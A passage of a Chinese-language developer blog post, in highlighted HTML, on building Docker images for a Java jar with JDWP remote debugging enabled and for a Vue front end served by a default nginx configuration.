class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> ln -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone</span></span><br></pre></td></tr></table></figure><p>maven打包，将jar包放置在src/main/docker文件夹内,配置dockerfile启动，Dockerfile选择新建的Dockerfile文件。</p><p><img src="/2020/07/17/56061/3.png" alt="1594951904"></p><p>最后运行docker，会构建镜像及启动容器。</p><h1 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h1><p><img src="/2020/07/17/56061/4.png" alt="1594951904"></p><p>添加Remote，host填写服务器ip，port填写监听端口，复制</p><p><code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=11005</code></p><p>到Dockerfile文件中</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> zyj &lt;<span class="number">1769072244</span>@qq.com&gt;</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /tmp</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> railway-platform-1.0.0-release.jar app.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">'touch /app.jar'</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8085</span> <span class="number">11005</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"java"</span>,<span class="string">"-Djava.security.egd=file:/dev/./urandom"</span>,<span class="string">"-jar"</span>,<span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=11005"</span>,<span class="string">"/app.jar"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> ln -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone</span></span><br></pre></td></tr></table></figure><p>点击下方+号，添加Dockerfile文件。debug启动，结束。</p><p><img src="/2020/07/17/56061/5.png" alt="1594951904"></p><h1 id="webstorm远程部署vue"><a href="#webstorm远程部署vue" class="headerlink" title="webstorm远程部署vue"></a>webstorm远程部署vue</h1><p>和idea操作基本一致，在根目录新建nginx.conf</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs&#x2F;error.log;</span><br><span class="line">#error_log  logs&#x2F;error.log  notice;</span><br><span class="line">#error_log  logs&#x2F;error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">    #                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">    #                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs&#x2F;host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #error_page  404              &#x2F;404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page &#x2F;50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">        location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http:&#x2F;&#x2F;127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  &#x2F;scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&#39;s document root</span><br><span class="line">        # concurs with nginx&#39;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ &#x2F;\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">MAINTAINER</span> zyj &lt;<span class="number">1769072244</span>@qq.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> dist/  /usr/share/nginx/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> nginx.conf /etc/nginx/nginx.conf</span></span><br></pre></td></tr></table></figure><p>build打包，然后docker部署。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>CI/CD</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
